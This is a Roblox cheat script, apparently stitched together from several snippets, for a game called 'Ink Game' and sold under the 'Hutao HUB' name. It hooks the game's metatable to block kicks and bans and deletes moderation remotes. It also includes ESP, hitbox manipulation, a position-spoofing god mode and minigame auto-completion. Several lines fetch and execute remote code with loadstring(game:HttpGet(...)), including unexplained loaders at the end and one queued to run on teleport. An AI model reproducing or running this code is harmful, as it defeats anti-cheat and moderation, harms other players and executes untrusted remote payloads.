        end

        fpsCounter = 0
        fpsLastUpdate = tick()
    end
end)

-- ‚úÖ Fluent GUI Toggles chu·∫©n
local fpsToggle = Tabs.Misc:AddToggle("ShowFPSToggle", {
    Title = "Show FPS",
    Default = true
})
fpsToggle:OnChanged(function(val)
    showFPS = val
    fpsText.Visible = val
end)

local pingToggle = Tabs.Misc:AddToggle("ShowPingToggle", {
    Title = "Show Ping",
    Default = true
})
pingToggle:OnChanged(function(val)
    showPing = val
    msText.Visible = val
end)





local ViewPosition = false
local coordGui = nil

-- T·∫°o GUI ƒë·ªÉ hi·ªÉn th·ªã t·ªça ƒë·ªô
local function CreateCoordGui()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "CoordDisplay"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    local Frame = Instance.new("Frame")
    Frame.Name = "CoordFrame"
    Frame.Size = UDim2.new(0, 250, 0, 60)
    Frame.Position = UDim2.new(1, -260, 1, -100)
    Frame.AnchorPoint = Vector2.new(0, 1)
    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Frame.BackgroundTransparency = 0.2
    Frame.BorderSizePixel = 0
    Frame.Parent = ScreenGui

    local UICorner = Instance.new("UICorner", Frame)
    UICorner.CornerRadius = UDim.new(0, 8)

    local TextLabel = Instance.new("TextLabel")
    TextLabel.Name = "CoordLabel"
    TextLabel.Size = UDim2.new(1, 0, 1, 0)
    TextLabel.Position = UDim2.new(0, 0, 0, 0)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Font = Enum.Font.GothamBold
    TextLabel.TextSize = 14
    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.Text = "X: 0 | Y: 0 | Z: 0"
    TextLabel.TextWrapped = true
    TextLabel.Parent = Frame

    coordGui = ScreenGui
end

-- C·∫≠p nh·∫≠t t·ªça ƒë·ªô m·ªói gi√¢y
local function UpdateCoordsLoop()
    task.spawn(function()
        while ViewPosition do
            task.wait(1)
            local char = game.Players.LocalPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root and coordGui then
                local label = coordGui:FindFirstChild("CoordFrame") and coordGui.CoordFrame:FindFirstChild("CoordLabel")
                if label then
                    local pos = root.Position
                    label.Text = string.format("X: %.1f | Y: %.1f | Z: %.1f", pos.X, pos.Y, pos.Z)
                end
            end
        end
    end)
end

-- Toggle
Tabs.Misc:AddToggle("ViewPositionToggle", {
    Title = "Show Coordinates",
    Default = false
}):OnChanged(function(Value)
    ViewPosition = Value

    if Value then
        if not coordGui then
            CreateCoordGui()
        end
        UpdateCoordsLoop()
    else
        if coordGui then
            coordGui:Destroy()
            coordGui = nil
        end
    end
end)



    Tabs.Misc:AddSection("‚Ü≥ FPS")

local CollectionService = game:GetService("CollectionService")

local EffectsToggle = Tabs.Misc:AddToggle("EffectsDisablerToggle", {
    Title = "Fix Lag PRO",
    Default = false
})

local running = false
local tagName = "EffectDisabledByScript"

EffectsToggle:OnChanged(function(Value)
    running = Value

    if Value then
        task.spawn(function()
            while running do
                for _, v in ipairs(game:GetDescendants()) do
                    if not CollectionService:HasTag(v, tagName) then
                        if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
                            v.Material = Enum.Material.SmoothPlastic
                            CollectionService:AddTag(v, tagName)

                        elseif v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
                            v.Enabled = false
                            CollectionService:AddTag(v, tagName)

                        elseif v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
                            v.Enabled = false
                            CollectionService:AddTag(v, tagName)

                        elseif v:IsA("Decal") or v:IsA("Texture") then
                            v.Texture = ""
                            CollectionService:AddTag(v, tagName)

                        elseif v:IsA("Sky") then
                            v:Destroy()
                        end
                    end
                end
                task.wait(30)
            end
        end)
    end
end)



    Tabs.Misc:AddSection("‚Ü≥ Bypass")

    local UIS = game:GetService("UserInputService")
    local SkipHoldToggle = Tabs.Misc:AddToggle("SkipHoldToggle", {Title = "Fast Help Player", Default = false})

    local function skipHoldPrompt(prompt)
        if prompt and prompt:IsA("ProximityPrompt") and prompt.HoldDuration > 0 then
            -- Store original HoldDuration if not already stored
            if prompt:GetAttribute("OriginalHold") == nil then
                prompt:SetAttribute("OriginalHold", prompt.HoldDuration)
            end
            prompt.HoldDuration = 0 -- Remove hold time
        end
    end

    local function enableSkipHold()
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("ProximityPrompt") then
                skipHoldPrompt(obj)
            end
        end

        -- Ensure new prompts also get modified
        local connection
        connection = workspace.DescendantAdded:Connect(function(obj)
            task.wait(0.1) -- Prevent errors
            if SkipHoldToggle.Value then
                skipHoldPrompt(obj)
            else
                connection:Disconnect() -- Stop listening if disabled
            end
        end)
    end

    local function disableSkipHold()
        for _, obj in ipairs(workspace:GetDescendants()) do
            if obj:IsA("ProximityPrompt") then
                local originalHold = obj:GetAttribute("OriginalHold")
                if originalHold then
                    obj.HoldDuration = originalHold -- Restore original HoldDuration
                    obj:SetAttribute("OriginalHold", nil) -- Remove stored attribute
                end
            end
        end
    end

    SkipHoldToggle:OnChanged(function()
        if SkipHoldToggle.Value then
            enableSkipHold()
        else
            disableSkipHold()
        end
    end)





-- Th√™m v√†o ph·∫ßn Tabs.Misc c·ªßa Fluent GUI:
Tabs.Misc:AddToggle("AntiBanToggle", {
    Title = "Anti ban",
    Default = true,
    Callback = function(state)
        if state then
            -- [üî• 2025 ADVANCED ANTI BAN BYPASS üî•]
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer
            local mt = getrawmetatable(game)
            local TeleportService = game:GetService("TeleportService")
            local OldNamecall = mt.__namecall
            setreadonly(mt, false)

            mt.__namecall = newcclosure(function(self, ...)
                local method = getnamecallmethod()
                if (method == "Kick" or tostring(self) == "Kick") then
                    warn("[ANTI-BAN] ƒê√£ ch·∫∑n Kick b·ªüi __namecall")
                    return
                end
                return OldNamecall(self, ...)
            end)

            LocalPlayer.Kick = function()
                warn("[ANTI-BAN] ƒê√£ ch·∫∑n Kick t·ª´ LocalPlayer.Kick")
            end

            local oldDestroy = LocalPlayer.Destroy
            LocalPlayer.Destroy = function(...)
                warn("[ANTI-BAN] ƒê√£ ch·∫∑n Destroy Player")
            end

            spawn(function()
                while task.wait(0.5) do
                    for _, gui in pairs(LocalPlayer:WaitForChild("PlayerGui"):GetDescendants()) do
                        if gui:IsA("TextLabel") or gui:IsA("TextBox") or gui:IsA("TextButton") then
                            local lowerText = string.lower(gui.Text or "")
                            if lowerText:find("banned") or lowerText:find("modded client") or lowerText:find("logged") then
                                warn("[ANTI-BAN] X√≥a GUI c·∫£nh b√°o:", gui.Text)
                                gui:Destroy()
                            end
                        end
                    end
                end
            end)

            local function removeSuspiciousRemotes()
                for _, v in pairs(game:GetDescendants()) do
                    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                        local name = v.Name:lower()
                        if name:find("ban") or name:find("kick") or name:find("log") or name:find("report") then
                            warn("[ANTI-BAN] Xo√° Remote nghi v·∫•n:", v:GetFullName())
                            v:Destroy()
                        end
                    end
                end
            end

            removeSuspiciousRemotes()
            game.DescendantAdded:Connect(function(desc)
                task.wait()
                if desc:IsA("RemoteEvent") or desc:IsA("RemoteFunction") then
                    local name = desc.Name:lower()
                    if name:find("ban") or name:find("kick") or name:find("log") or name:find("report") then
                        warn("[ANTI-BAN] Xo√° Remote m·ªõi ph√°t hi·ªán:", desc:GetFullName())
                        desc:Destroy()
                    end
                end
            end)

            local function protectRemotes()
                for _, v in pairs(game:GetDescendants()) do
                    if v:IsA("RemoteEvent") then
                        local old = v.FireServer
                        v.FireServer = function(self, ...)
                            local args = {...}
                            local content = tostring(args[1]):lower()
                            if content:find("modded") or content:find("log") then
                                warn("[ANTI-BAN] Blocked suspicious RemoteEvent:", v.Name)
                                return
                            end
                            return old(self, unpack(args))
                        end
                    elseif v:IsA("RemoteFunction") then
                        local old = v.InvokeServer
                        v.InvokeServer = function(self, ...)
                            local args = {...}
                            local content = tostring(args[1]):lower()
                            if content:find("modded") or content:find("log") then
                                warn("[ANTI-BAN] Blocked suspicious RemoteFunction:", v.Name)
                                return
                            end
                            return old(self, unpack(args))
                        end
                    end
                end
            end

            protectRemotes()

            LocalPlayer.OnTeleport:Connect(function(state)
                if state == Enum.TeleportState.Failed then
                    warn("[ANTI-BAN] B·ªã Teleport Kick ‚Äì ƒëang c·ªë g·∫Øng Rejoin...")
                    TeleportService:Teleport(game.PlaceId, LocalPlayer)
                end
            end)

            warn("[‚úÖ ANTI-BAN LOADED] ‚Äì ƒê√£ k√≠ch ho·∫°t b·∫£o v·ªá t·ªëi ƒëa")
        else
            warn("[ANTI-BAN] ƒê√£ t·∫Øt ‚Äì b·∫°n s·∫Ω kh√¥ng ƒë∆∞·ª£c b·∫£o v·ªá n·ªØa")
        end
    end
})




--== GUI FLUENT SETUP & ANTI-KICK TOGGLE INTEGRATION ==--

local getgenv, getnamecallmethod, hookmetamethod, hookfunction, newcclosure, checkcaller =
    getgenv, getnamecallmethod, hookmetamethod, hookfunction, newcclosure, checkcaller

local string_lower, string_gsub = string.lower, string.gsub

if getgenv().ED_AntiKick then return end

-- GUI settings
local Fluent = require(--[[ your path or loader for Fluent UI ]])
local Window = Fluent:CreateWindow({ Title = "My Hub", SubTitle = "Anti‚ÄëKick System" })
local Tabs = {
    Misc = Window:AddTab({ Title = "Misc", Icon = "‚öôÔ∏è" })
}

-- Notification helper
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function notify(title, text, duration, icon)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 3,
        Icon = icon
    })
end

-- Anti‚ÄëKick core variables
getgenv().ED_AntiKick = {
    Enabled = true,
    SendNotifications = true,
    CheckCaller = true
}

-- Kick keywords detection
local kickKeywords = {"kick", "shutdown", "ban", "destroy", "kickplayer", "kickuser"}
local function containsKickKeyword(str)
    if not str then return false end
    local lowerStr = string_lower(str)
    for _, keyword in pairs(kickKeywords) do
        if string_lower(keyword) and string.match(lowerStr, string_lower(keyword)) then
            return true
        end
    end
    return false
end

local function compareInstances(inst1, inst2)
    if typeof(inst1) == "Instance" and typeof(inst2) == "Instance" then
        return inst1 == inst2
    end
    return false
end

-- Hook metatable Namecall and Kick
local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
local oldKickFunction = LocalPlayer.Kick
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}

    if getgenv().ED_AntiKick.Enabled then
        local pass = (not getgenv().ED_AntiKick.CheckCaller) or (getgenv().ED_AntiKick.CheckCaller and not checkcaller())
        if pass and compareInstances(self, LocalPlayer) and string_gsub(method, "^%l", string.upper) == "Kick" then
            if getgenv().ED_AntiKick.SendNotifications then
                notify("XploitWare - Anti‚ÄëKick", "Successfully intercepted kick.", 2, "rbxassetid://6238540373")
            end
            return
        end
    end

    if containsKickKeyword(method) then
        return
    end

    return oldNamecall(self, ...)
end)
setreadonly(mt, true)

LocalPlayer.Kick = newcclosure(function(...)
    local pass = (not getgenv().ED_AntiKick.CheckCaller) or (getgenv().ED_AntiKick.CheckCaller and not checkcaller())
    if pass and getgenv().ED_AntiKick.Enabled then
        if getgenv().ED_AntiKick.SendNotifications then
            notify("XploitWare - Anti‚ÄëKick", "Successfully intercepted kick.", 2, "rbxassetid://6238540373")
        end
        return
    end
    return oldKickFunction(...)
end)

-- Hook remotes to block suspicious messages
local function hookRemote(remote)
    if remote:IsA("RemoteEvent") then
        local oldFire = remote.FireServer
        remote.FireServer = function(self, ...)
            local args = {...}
            for _, v in pairs(args) do
                if type(v) == "string" and containsKickKeyword(v) then
                    if getgenv().ED_AntiKick.SendNotifications then
                        notify("XploitWare - Anti‚ÄëKick", "Blocked kick RemoteEvent call.", 2)
                    end
                    return
                end
            end
            return oldFire(self, ...)
        end
    elseif remote:IsA("RemoteFunction") then
        local oldInvoke = remote.InvokeServer
        remote.InvokeServer = function(self, ...)
            local args = {...}
            for _, v in pairs(args) do
                if type(v) == "string" and containsKickKeyword(v) then
                    if getgenv().ED_AntiKick.SendNotifications then
                        notify("XploitWare - Anti‚ÄëKick", "Blocked kick RemoteFunction call.", 2)
                    end
                    return
                end
            end
            return oldInvoke(self, ...)
        end
    end
end

local function scanAndHookRemotes()
    local containers = {ReplicatedStorage, workspace}
    for _, c in pairs(containers) do
        for _, remote in pairs(c:GetDescendants()) do
            if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                pcall(hookRemote, remote)
            end
        end
    end
end

scanAndHookRemotes()
coroutine.wrap(function()
    while true do
        wait(30)
        scanAndHookRemotes()
    end
end)()

-- Integrate with Admin globals if available
local success, Admin = pcall(function() return _G.Adonis or _G.Admin end)
if success and Admin then
    for name, func in pairs(Admin) do
        if type(func) == "function" and containsKickKeyword(name) then
            Admin[name] = function(...)
                if getgenv().ED_AntiKick.SendNotifications then
                    notify("XploitWare - Anti‚ÄëKick", "Blocked Adonis kick function: "..name, 2)
                end
                return
            end
        end
    end
end

-- Toggle control in GUI
Tabs.Misc:AddToggle("Toggle_AntiKick", {
    Title = "Anti-Kick",
    Default = true,
    Callback = function(state)
        getgenv().ED_AntiKick.Enabled = state
        if getgenv().ED_AntiKick.SendNotifications then
            notify("XploitWare - Anti‚ÄëKick", (state and "ƒê√£ b·∫≠t" or "ƒê√£ t·∫Øt").." b·∫£o v·ªá kick.", 3, "rbxassetid://6238540373")
        end
    end
})

-- Initial activation notification
if getgenv().ED_AntiKick.SendNotifications then
    notify("XploitWare - Anti‚ÄëKick", "Anti‚ÄëKick system initialized and active.", 3, "rbxassetid://6238540373")
end



-- Tabs.Settings


local AexecToggle = Tabs.Settings:AddToggle("AexecToggle", {Title = "Auto Execute", Default = false })
AexecToggle:OnChanged(function(Value)
    if Value then
        task.spawn(function()
            pcall(function()
                if queue_on_teleport then
                    local HutaoHubScript1 = [[
task.wait(3)
loadstring(game:HttpGet('https://raw.githubusercontent.com/hungquan99/SkullHub/main/loader.lua'))()
]]
                    queue_on_teleport(HutaoHubScript1)
                end
            end)
        end)
        Fluent:Notify({
            Title = "Hutao HUB",
            Content = "Auto execute is enabled!",
            Duration = 5
        })
    else
        Fluent:Notify({
            Title = "Hutao HUB",
            Content = "Auto execute is disabled!",
            Duration = 5
        })
    end
end)

SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)

-- Ignore keys that are used by ThemeManager.
-- (we dont want configs to save themes, do we?)
SaveManager:IgnoreThemeSettings()

-- You can add indexes of elements the save manager should ignore
SaveManager:SetIgnoreIndexes({})

-- use case for doing it this way:
-- a script hub could have themes in a global folder
-- and game configs in a separate folder per game
InterfaceManager:SetFolder("Hutao HUB")
SaveManager:SetFolder("Hutao HUB/Ink Game")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

-- Select First Tab By Default
Window:SelectTab(1)

Fluent:Notify({ Title = "Hutao HUB", Content = "Ink Game script loaded successfully!", Duration = 5 })
SaveManager:LoadAutoloadConfig()


-- üü¢ DRAGGABLE UI BUTTON WITH ENHANCED CLICK AND HOVER ANIMATIONS
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local ExistingUI = CoreGui:FindFirstChild("HutaoHubMinimizeUI")
if ExistingUI then
    ExistingUI:Destroy()
end

-- Create Floating UI
local DragUI = Instance.new("ScreenGui")
DragUI.Name = "HutaoHubMinimizeUI"
DragUI.ResetOnSpawn = false
DragUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling -- Ensures highest rendering priority
DragUI.Parent = CoreGui -- Overrides all other UI elements

-- Create Circular Button (Draggable + Clickable)
local Button = Instance.new("ImageButton")
Button.Parent = DragUI
Button.Size = UDim2.new(0, 50, 0, 50) -- Adjust size if needed
Button.Position = UDim2.new(0, 10, 1, -85) -- Initial position
Button.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Windows 11 Style
Button.BackgroundTransparency = 0.3 -- Semi-transparent
Button.BorderSizePixel = 0
Button.ClipsDescendants = true
Button.Image = "rbxassetid://90508203972003" -- Replace with your custom image ID
Button.ScaleType = Enum.ScaleType.Fit
Button.Active = true -- Allows drag functionality
Button.ZIndex = 1000 -- Ensure it stays on top

-- Make UI Circular
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(1, 0) -- Full circle
UICorner.Parent = Button

-- Tween Info for Animations
local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- Function to simulate RightShift key press
local function SimulateKeyPress()
    VirtualInputManager:SendKeyEvent(true, minimizeUI, false, game)
    task.wait(0.1)
    VirtualInputManager:SendKeyEvent(false, minimizeUI, false, game)
end

-- Click Animation & UI Toggle (Only if NOT dragged too much)
local isDragging = false
local dragThreshold = 10 -- Allow small movement without canceling click

Button.MouseButton1Click:Connect(function()
    if isDragging then return end -- Prevent click after large dragging

    -- Enhanced Click Animation
    local tween = TweenService:Create(Button, tweenInfo, {
        BackgroundTransparency = 0.5,
        Size = UDim2.new(0, 45, 0, 45),
        Rotation = 5
    })
    tween:Play()
    task.wait(0.1)
    local tweenBack = TweenService:Create(Button, tweenInfo, {
        BackgroundTransparency = 0.3,
        Size = UDim2.new(0, 50, 0, 50),
        Rotation = 0
    })
    tweenBack:Play()

    -- Simulate RightShift to Toggle UI
    SimulateKeyPress()
end)

-- Hover Animation
Button.MouseEnter:Connect(function()
    TweenService:Create(Button, tweenInfo, {Size = UDim2.new(0, 55, 0, 55)}):Play()
end)

Button.MouseLeave:Connect(function()
    TweenService:Create(Button, tweenInfo, {Size = UDim2.new(0, 50, 0, 50)}):Play()
end)

-- Dragging Logic for PC & Mobile
local dragging, dragStart, startPos

local function StartDrag(input)
    isDragging = false -- Reset dragging state
    dragging = true
    dragStart = input.Position
    startPos = Button.Position

    input.Changed:Connect(function()
        if input.UserInputState == Enum.UserInputState.End then
            dragging = false
        end
    end)
end

local function OnDrag(input)
    if dragging then
        local delta = (input.Position - dragStart).Magnitude
        if delta > dragThreshold then -- Only mark as dragged if movement exceeds threshold
            isDragging = true
        end
        Button.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + (input.Position.X - dragStart.X),
            startPos.Y.Scale,
            startPos.Y.Offset + (input.Position.Y - dragStart.Y)
        )
    end
end

-- Dragging Support for PC & Mobile (on the same button)
Button.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        StartDrag(input)
    end
end)

Button.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        OnDrag(input)
    end
end)      








-- Tab.Main


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local AutoHitboxNPC = false
local forwardDistance = 6
local ClonedNPCParts = {}

-- Danh s√°ch NPC b·ªã ch·∫∑n hitbox (ch·ªØ th∆∞·ªùng)
local BlockedNPCNames = {
	["adjute"] = true,
	["frontman"] = true,
	["badpreload"] = true
}

-- Ki·ªÉm tra part h·ª£p l·ªá
local function IsValidHitbox(part)
	return part:IsA("BasePart") and part.Name ~= "HumanoidRootPart"
end

-- T·∫°o hitbox t·ª´ NPC kh√¥ng b·ªã ch·∫∑n (clone full ng∆∞·ªùi)
local function CloneNPCHitboxes()
	-- X√≥a hitbox c≈©
	for _, part in ipairs(ClonedNPCParts) do
		if part and part.Parent then part:Destroy() end
	end
	table.clear(ClonedNPCParts)

	for _, npc in ipairs(workspace:GetDescendants()) do
		if npc:IsA("Model") and not Players:GetPlayerFromCharacter(npc) and npc:FindFirstChildOfClass("Humanoid") then
			local lowerName = npc.Name:lower()
			if not BlockedNPCNames[lowerName] then
				for _, part in ipairs(npc:GetDescendants()) do
					if IsValidHitbox(part) then
						local clone = part:Clone()
						clone.Anchored = true
						clone.CanCollide = false
						clone.Transparency = 1 -- ·∫®n ho√†n to√†n
						clone.Material = Enum.Material.SmoothPlastic
						clone.Size = part.Size * 3
						clone.Name = "[NPC_Hitbox]"
						clone.Parent = workspace
						table.insert(ClonedNPCParts, clone)
					end
				end
			end
		end
	end
end

-- Di chuy·ªÉn to√†n b·ªô hitbox v√†o c√πng m·ªôt ch·ªó tr∆∞·ªõc m·∫∑t player
local function UpdateHitboxPositions()
	local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not root then return end

	local targetPos = root.Position + root.CFrame.LookVector * forwardDistance + Vector3.new(0, 3, 0)
	for _, part in ipairs(ClonedNPCParts) do
		if part and part.Parent then
			part.CFrame = CFrame.new(targetPos)
		end
	end
end

-- Toggle Fluent GUI
Tabs.Main:AddToggle("AutoNPC_Hitbox", {
	Title = "Auto Kill NPC",
	Default = false
}):OnChanged(function(Value)
	AutoHitboxNPC = Value

	if Value then
		task.spawn(function()
			while AutoHitboxNPC do
				CloneNPCHitboxes()
				UpdateHitboxPositions()
				task.wait(0.5)
			end
		end)
	else
		for _, part in ipairs(ClonedNPCParts) do
			if part and part.Parent then
				part:Destroy()
			end
		end
		table.clear(ClonedNPCParts)
	end
end)



local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

-- ESP Container
local npcDrawings = {}
local npcConnection

-- H√†m t·∫°o ESP cho NPC
local function createNPCESP(npc)
    if npcDrawings[npc] then return end

    local text = Drawing.new("Text")
    text.Size = 14
    text.Center = true
    text.Outline = true
    text.Visible = false
    text.Color = Color3.fromRGB(0, 255, 0) -- Xanh l√°

    npcDrawings[npc] = text
end

-- Xo√° ESP NPC
local function removeNPCESP(npc)
    if npcDrawings[npc] then
        npcDrawings[npc]:Remove()
        npcDrawings[npc] = nil
    end
end

-- B·∫Øt ƒë·∫ßu ESP NPC
local function startNPCESP()
    -- Qu√©t to√†n b·ªô c√°c NPC c√≥ Humanoid
    for _, npc in ipairs(workspace:GetDescendants()) do
        if npc:IsA("Model") and not game:GetService("Players"):FindFirstChild(npc.Name) then
            if npc:FindFirstChild("Humanoid") and npc:FindFirstChild("HumanoidRootPart") then
                createNPCESP(npc)
            end
        end
    end

    npcConnection = RunService.RenderStepped:Connect(function()
        for npc, text in pairs(npcDrawings) do
            if npc and npc:FindFirstChild("HumanoidRootPart") and npc:FindFirstChild("Humanoid") then
                local hrp = npc.HumanoidRootPart
                local humanoid = npc.Humanoid

                if humanoid.Health > 0 then
                    local pos, visible = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, 2.5, 0))
                    local distance = (hrp.Position - Camera.CFrame.Position).Magnitude
                    text.Text = string.format("%s [%.0fm]", npc.Name, distance)
                    text.Position = Vector2.new(pos.X, pos.Y)
                    text.Visible = visible
                else
                    text.Visible = false
                end
            else
                text.Visible = false
            end
        end
    end)
end

-- D·ª´ng ESP NPC
local function stopNPCESP()
    if npcConnection then
        npcConnection:Disconnect()
        npcConnection = nil
    end

    for _, text in pairs(npcDrawings) do
        text:Remove()
    end
    npcDrawings = {}
end

-- ‚úÖ T√≠ch h·ª£p Fluent GUI Toggle trong Tabs.ESP
Tabs.Main:AddToggle("ESPNPC", {
    Title = "ESP NPC V2",
    Default = false,
}):OnChanged(function(enabled)
    if enabled then
        startNPCESP()
    else
        stopNPCESP()
    end
end)


local Toggles = {}

-- ‚úÖ T·∫°o c√°c Toggle
Toggles.RedLightGodMode = Tabs.Main:AddToggle("RedLightGodMode", { Title = "Red Light God Mode", Default = false })
Toggles.DalgonaAuto = Tabs.Main:AddToggle("DalgonaAuto", { Title = "Dalgona Auto Complete", Default = false })
Toggles.TugOfWarAuto = Tabs.Main:AddToggle("TugOfWarAuto", { Title = "Tug Of War Auto Pull", Default = false })
Toggles.GlassBridgeESP = Tabs.Main:AddToggle("GlassBridgeESP", { Title = "Glass Bridge ESP", Default = false })
Toggles.MinglePowerHoldAuto = Tabs.Main:AddToggle("MinglePowerHoldAuto", { Title = "Mingle Auto QTE", Default = false })

-- ‚úÖ Global GetToggleValue function
local function GetToggleValue(key)
    return Toggles[key] and Toggles[key].Value
end

-- ‚úÖ Red Light Green Light God Mode
do
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local Client = Players.LocalPlayer
    local TrafficLightImage = Client.PlayerGui:WaitForChild("ImpactFrames"):WaitForChild("TrafficLightEmpty")

    local IsGreenLight = TrafficLightImage.Image == ReplicatedStorage.Effects.Images.TrafficLights.GreenLight.Image
    local LastRootPartCFrame = nil

    ReplicatedStorage.Remotes.Effects.OnClientEvent:Connect(function(EffectsData)
        if EffectsData.EffectName == "TrafficLight" then
            IsGreenLight = EffectsData.GreenLight == true
            local RootPart = Client.Character and Client.Character:FindFirstChild("HumanoidRootPart")
            LastRootPartCFrame = RootPart and RootPart.CFrame
        end
    end)

    local OldNamecall
    OldNamecall = hookfunction(getrawmetatable(game).__namecall, newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = { ... }

        if method == "FireServer" and self.ClassName == "RemoteEvent" and self.Name == "rootCFrame" then
            if GetToggleValue("RedLightGodMode") and not IsGreenLight and LastRootPartCFrame then
                args[1] = LastRootPartCFrame
                return OldNamecall(self, unpack(args))
            end
        end

        return OldNamecall(self, ...)
    end))
end

-- ‚úÖ Dalgona Auto Complete
do
    local Module = game.ReplicatedStorage.Modules.Games.DalgonaClient

    local function CompleteDalgona()
        if not GetToggleValue("DalgonaAuto") then return end

        for _, f in ipairs(getreg()) do
            if typeof(f) == "function" and islclosure(f) then
                if getfenv(f).script == Module then
                    if getinfo(f).nups == 73 then
                        setupvalue(f, 31, 9e9)
                        break
                    end
                end
            end
        end
    end

    local Original
    Original = hookfunction(require(Module), function(...)
        task.delay(3, CompleteDalgona)
        return Original(...)
    end)

    Toggles.DalgonaAuto:OnChanged(CompleteDalgona)
end

-- ‚úÖ Tug of War Auto
do
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Remote = ReplicatedStorage.Remotes.TemporaryReachedBindable
    local VALID_PULL_DATA = { ["PerfectQTE"] = true }

    task.spawn(function()
        while task.wait(0.025) do
            if GetToggleValue("TugOfWarAuto") then
                Remote:FireServer(VALID_PULL_DATA)
            end
        end
    end)
end

-- ‚úÖ Glass Bridge ESP
do
    local GlassHolder = workspace:WaitForChild("GlassBridge"):WaitForChild("GlassHolder")

    local function SetupGlassPart(part)
        if not GetToggleValue("GlassBridgeESP") then
            part.Color = Color3.fromRGB(106, 106, 106)
            part.Transparency = 0.45
            part.Material = Enum.Material.SmoothPlastic
        else
            local color = part:GetAttribute("exploitingisevil") and Color3.fromRGB(248, 87, 87) or Color3.fromRGB(28, 235, 87)
            part.Color = color
            part.Transparency = 0
            part.Material = Enum.Material.Neon
        end
    end

    local function UpdateAll()
        for _, panelPair in ipairs(GlassHolder:GetChildren()) do
            for _, panel in ipairs(panelPair:GetChildren()) do
                local glass = panel:FindFirstChild("glasspart")
                if glass then
                    SetupGlassPart(glass)
                end
            end
        end
    end

    Toggles.GlassBridgeESP:OnChanged(UpdateAll)

    GlassHolder.DescendantAdded:Connect(function(desc)
        if desc.Name == "glasspart" and desc:IsA("BasePart") then
            SetupGlassPart(desc)
        end
    end)
end

-- ‚úÖ Mingle Power Hold Auto
do
    local Players = game:GetService("Players")
    local Client = Players.LocalPlayer

    local function Setup(Character)
        Character.ChildAdded:Connect(function(child)
            if child:IsA("RemoteEvent") and child.Name == "RemoteForQTE" then
                task.spawn(function()
                    while child and child.Parent do
                        if GetToggleValue("MinglePowerHoldAuto") then
                            child:FireServer()
                        end
                        task.wait(0.5)
                    end
                end)
            end
        end)

        for _, obj in ipairs(Character:GetChildren()) do
            if obj:IsA("RemoteEvent") and obj.Name == "RemoteForQTE" then
                task.spawn(function()
                    while obj and obj.Parent do
                        if GetToggleValue("MinglePowerHoldAuto") then
                            obj:FireServer()
                        end
                        task.wait(0.5)
                    end
                end)
            end
        end
    end

    if Client.Character then Setup(Client.Character) end
    Client.CharacterAdded:Connect(Setup)
end


loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemSecRoblox/SystemSec/refs/heads/main/main.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hehehe9028/INK-GAME/refs/heads/main/Ink%20game%20RVVC%20SCRIPTS%20VEX"))()

